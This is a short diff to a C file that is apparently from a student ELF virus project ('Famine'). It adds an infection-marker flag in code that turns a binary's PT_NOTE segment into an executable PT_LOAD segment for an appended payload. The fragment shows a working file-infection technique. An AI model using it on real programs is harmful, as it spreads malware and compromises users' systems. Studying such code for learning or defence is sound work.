@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/11/06 09:45:03 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/07 10:16:24 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/20 11:53:40 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -96,7 +96,7 @@ bool	change_note_segment(profiling *this, elf_data *data) {
 		return true;
 	
 	note->p_type = PT_LOAD;
-	note->p_flags = PF_R | PF_X;
+	note->p_flags = PF_R | PF_X | PF_FAMINE;
 	note->p_filesz += this->size + SIGNATURE_OFFSET + SIGNATURE_LEN;
 	note->p_memsz = note->p_filesz;
 	note->p_offset = data->mmap_size + 0x1000 - (data->mmap_size % 0x1000);
